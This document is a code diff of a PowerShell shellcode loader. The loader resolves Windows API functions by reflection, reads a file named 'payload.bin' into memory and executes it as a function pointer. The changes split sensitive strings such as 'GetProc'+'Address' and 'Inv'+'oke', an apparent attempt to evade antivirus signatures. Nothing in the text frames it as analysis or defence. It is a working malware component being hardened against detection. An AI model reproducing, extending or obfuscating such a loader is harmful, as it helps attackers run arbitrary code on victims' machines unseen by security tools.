@@ -8,7 +8,7 @@ function func_get_delegate_type_new {
         [Parameter(Position = 1)] [Type] $var_return_type = [Void]
     )
     $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+    $var_type_builder.DefineConstructor('RTSpec'+'ialName, HideB'+'ySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
     $var_type_builder.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
     return $var_type_builder.CreateType()
 }
@@ -17,10 +17,9 @@ function func_get_proc_address_new {
     Param ($var_module, $var_procedure)    
     $var_unsafe_native_methods = [AppDomain]::CurrentDomain.GetAssemblies()
     $var_unsafe_native_methods_news = ($var_unsafe_native_methods  | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $var_gpa = $var_unsafe_native_methods_news.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+    $var_gpa = $var_unsafe_native_methods_news.GetMethod('GetProc'+'Address', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
     return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods_news.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
 }
-
 
 If ([IntPtr]::size -eq 8) {
 	[Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
@@ -30,3 +29,5 @@ If ([IntPtr]::size -eq 8) {
 	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new @([IntPtr]) ([Void])))
 	$var_runme.Invoke([IntPtr]::Zero)
 }
+
+
